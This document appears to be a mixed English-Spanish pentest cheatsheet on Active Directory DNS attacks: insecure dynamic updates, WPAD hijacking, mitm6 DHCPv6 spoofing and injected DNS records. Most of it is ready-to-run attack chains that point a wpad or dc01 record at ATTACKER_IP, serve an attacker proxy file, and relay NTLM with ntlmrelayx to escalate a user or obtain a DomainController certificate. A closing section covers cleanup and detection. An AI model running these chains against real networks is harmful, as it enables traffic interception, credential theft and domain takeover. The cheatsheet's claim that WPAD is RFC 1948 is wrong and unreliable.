---
aliases:
  - DNS Spoofing AD
  - WPAD Attack
  - DNS Records Injection
  - mitm6 DNS
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - DNS & SRV Records]]"
  - "[[NTLM Relay]]"
  - "[[mitm6 - IPv6 DHCP Spoofing]]"
  - "[[LLMNR & NBT-NS Poisoning]]"
---
# AD - DNS & SRV Records - DNS Spoofing & Records Injection

***

## DNS Insecure Dynamic Update

| **Vector** | **Cómo** | **Notas** |
|:---:|:---:|:---:|
| Insecure DDNS enabled | Anyone can update records | Critical misconfig. |
| `nsupdate` tool | Linux DDNS client | Standard. |
| Add A record sin auth | If insecure DDNS | Trivial. |
| Modify existing A record | Same | Same. |
| Add CNAME record | Aliasing target | Edge. |
| TXT record SPF/DKIM injection | Email spoof combo | Edge. |
| Replace existing record | Overwrite legit entry | Spoofing. |
| Removal (delete) record | DOS via removal | Edge. |
| Atacante machine account = update creator | Default ownership | Detection clue. |
| Detection: Event 5137 (DNS create) | Defender event | Adjacent. |
| Secure DDNS = Kerberos auth required | GSS-TSIG | Modern default. |
| Mixed mode (secure + insecure) | Common legacy gap | Vulnerable. |
| Per-zone setting | Different policies | Granular. |
| Reverse zones often less secure | Common oversight | Edge. |
| Fix: enforce secure DDNS only | Hardening | Defense. |
| Audit: scavenge + monitor adds | Standard | Defense. |
^ad-spoof-ddns

### Insecure DDNS test

```bash
# Check if DDNS allows insecure updates
nsupdate <<EOF
server DC
zone dom.local.
update add testrecord.dom.local. 60 A 1.2.3.4
send
EOF

# Verify creation
dig +short A testrecord.dom.local @DC

# If created → insecure DDNS = vulnerable
# Cleanup
nsupdate <<EOF
server DC
zone dom.local.
update delete testrecord.dom.local. A
send
EOF
```

___

## WPAD Attack

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| WPAD = Web Proxy Auto-Discovery | Browser auto-detects proxy | RFC 1948. |
| Default browser behavior | Query `wpad.<dom>` for `wpad.dat` | Default. |
| Attack: create wpad A record → attacker | Browser uses attacker proxy | MitM. |
| `wpad.dat` content | JS PAC file | Defines proxy. |
| Attack chain: WPAD → proxy → relay/sniff/inject | Multi-step | Comprehensive. |
| Modern browser blocks if WPAD via DHCP | DHCPv4 option 252 | Default modern. |
| WPAD via DNS still works | DNS-based discovery | Common vector. |
| LLMNR fallback if no WPAD record | Combo | Adjacent. |
| Default Authenticated Users can create | Common vulnerability | Critical default. |
| `wpad` blocked in some Windows versions (post-MS16-077) | Defense | Adjacent. |
| Edge.exe / Chrome / Firefox WPAD support | Differs per browser | Variable. |
| Internet Explorer respects WPAD | Default | Standard. |
| Modern Windows registry block | Group Policy | Defense. |
| Mobile: typically ignores WPAD | Defense | Edge. |
| Captive portal combo | Public WiFi + WPAD | Edge. |
| Detection: DNS audit on `wpad` queries | Defender | Adjacent. |
^ad-spoof-wpad

### WPAD attack chain

```bash
# Step 1: Create wpad A record (using DNS write permission)
python3 dnstool.py -u 'dom\user' -p pass -a add -r wpad -d ATTACKER_IP DC

# Step 2: Setup attacker proxy + wpad.dat
# Run Responder with WPAD support:
responder -I eth0 -wF -v

# Or custom HTTP server serving wpad.dat:
cat > wpad.dat <<EOF
function FindProxyForURL(url, host) {
    return "PROXY ATTACKER_IP:8080";
}
EOF

# Step 3: Wait for browsers to auto-config → relay/sniff traffic
# Combine with ntlmrelayx for SMB/HTTP relay
```

___

## mitm6 (IPv6 DHCP Spoofing)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Default Windows IPv6 enabled | Even on IPv4-only networks | Architecture. |
| DHCPv6 preference IPv6 > IPv4 | Windows default | Critical. |
| mitm6 spoofs DHCPv6 server | Atacante = DHCPv6 server | Standard. |
| Atacante's IP = DNS server (IPv6) | Override DNS via IPv6 | Trick. |
| All DNS queries → atacante | Selective DNS resolution | Powerful. |
| Combine with WPAD attack | mitm6 + responder + relay | Standard chain. |
| WPAD discovery via DNS → atacante answers | wpad.dom.local → ATTACKER_IPv6 | Combo. |
| Browser uses attacker proxy | Auto-config | Win. |
| Domain join requests → atacante | Privileged user logins | High-value. |
| Combine with ntlmrelayx -6 | NTLM Relay over IPv6 | Standard. |
| `mitm6 -d dom.local` | Filter target domain | Targeted. |
| `mitm6 --ignore-nofqdn` | Ignore non-FQDN | Edge. |
| Defense: disable IPv6 on hosts | Aggressive but effective | Defense. |
| Defense: block DHCPv6 broadcasts | Network-level | Defense. |
| Detection: rogue DHCPv6 server alerts | SIEM + network | Adjacent. |
| Modern IPv6 defenses (RA Guard) | Switch-level | Defense. |
^ad-spoof-mitm6

### mitm6 + relay chain

```bash
# Terminal 1: mitm6 (DHCPv6 spoofing + DNS)
mitm6 -d dom.local

# Terminal 2: ntlmrelayx (relay to LDAP/SMB)
ntlmrelayx.py -t ldaps://DC --escalate-user attacker_user --no-smb-server -wh attacker.dom.local

# Or relay to ADCS for cert
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController

# Wait for IPv6-enabled hosts to auth → relayed → privilege escalation
```

___

## DNS Spoofing via Records Injection

| **Vector** | **Target** | **Notas** |
|:---:|:---:|:---:|
| Replace `dc01.dom.local` A record | Auth queries → atacante | Critical. |
| Replace `_ldap._tcp.dc._msdcs` SRV | Direct LDAP redirect | Edge. |
| Replace `_kerberos._tcp` SRV | KDC redirect — Kerberos relay | Critical. |
| Add fake DC SRV record | Multiple DCs — high priority | Subtle. |
| Modify GC record | Forest queries → atacante | Edge. |
| Spoof internal app records | redirect HR/finance/email | Targeted. |
| Spoof MX record | Email interception | Mail combo. |
| Spoof TXT SPF | Allow attacker email | Spoof combo. |
| Spoof reverse PTR | False name resolution | Indirect. |
| ISATAP / 6to4 record | IPv6 tunnel hijack | Edge. |
| Conditional forwarder modification | Cross-zone redirect | Edge. |
| Time-based record swap | Ephemeral spoofing | Stealth. |
| TTL=1 records | Quick cache expiry | Manipulation. |
| Negative caching abuse | Force re-query | Manipulation. |
| Per-record ACL exploitation | Granular write permission | ACL combo. |
| `Authenticated Users CreateChild` default | Most zones vulnerable | Default. |
^ad-spoof-records

### Targeted spoof example

```bash
# Replace DC IP with attacker (devastating but loud)
python3 dnstool.py -u 'dom\user' -p pass -a remove -r dc01 DC
python3 dnstool.py -u 'dom\user' -p pass -a add -r dc01 -d ATTACKER_IP DC

# Verify
dig +short A dc01.dom.local @DC

# Result: clients lookup dc01 → attacker IP → can sniff/relay/MitM auth
# Restoration:
python3 dnstool.py -u 'dom\user' -p pass -a remove -r dc01 DC
python3 dnstool.py -u 'dom\user' -p pass -a add -r dc01 -d ORIGINAL_DC_IP DC
```

___

## Cleanup y Detection

| **Acción** | **Cómo** | **Notas** |
|:---:|:---:|:---:|
| Restore original record | Use original IP/value backup | Standard. |
| Remove malicious record | `dnstool -a remove` | Cleanup. |
| Verify scavenging didn't leave tombstone | `--remove-tombstone` | Edge. |
| Check DNS cache server-side | `dnscmd /clearcache` | Native. |
| Client-side cache clear | `ipconfig /flushdns` | Per-host. |
| Audit creation timestamp | `whenCreated` LDAP attribute | Timeline. |
| Audit creator | `nTSecurityDescriptor` ownership | Forensic. |
| DNS event log | Event ID 257 (DNS server) | Defender. |
| AD audit logs | Event ID 5137 (object create) | Defender. |
| Detection: scheduled DNS audit | Compare expected vs actual | Defense. |
| Detection: alert on `wpad`/`isatap` queries | Common attack name | Defense. |
| Detection: anomaly in dnsRecord modify rate | High volume = attack | Defense. |
| BloodHound DNS analytics | Future custom edges | Adjacent. |
| Microsoft Defender for Identity | DNS spoofing alerts | Defender. |
| Sysmon DNS event ID 22 | Per-host DNS | Adjacent. |
| Network DNS sniffing | Detect anomalous responses | Edge. |
^ad-spoof-cleanup

### Audit recently changed records

```powershell
# Records modified in last 24h
Get-ADObject -SearchBase "DC=DomainDnsZones,DC=dom,DC=local" `
  -Filter {whenChanged -gt (Get-Date).AddDays(-1)} `
  -Properties whenChanged,whenCreated,name,distinguishedName |
  Select Name,DistinguishedName,whenCreated,whenChanged |
  Sort whenChanged -Descending

# Per-record creator (via nTSecurityDescriptor owner)
$record = Get-ADObject "DC=test,DC=dom.local,DC=DomainDnsZones,DC=dom,DC=local" -Properties nTSecurityDescriptor
$record.nTSecurityDescriptor.Owner
```

***
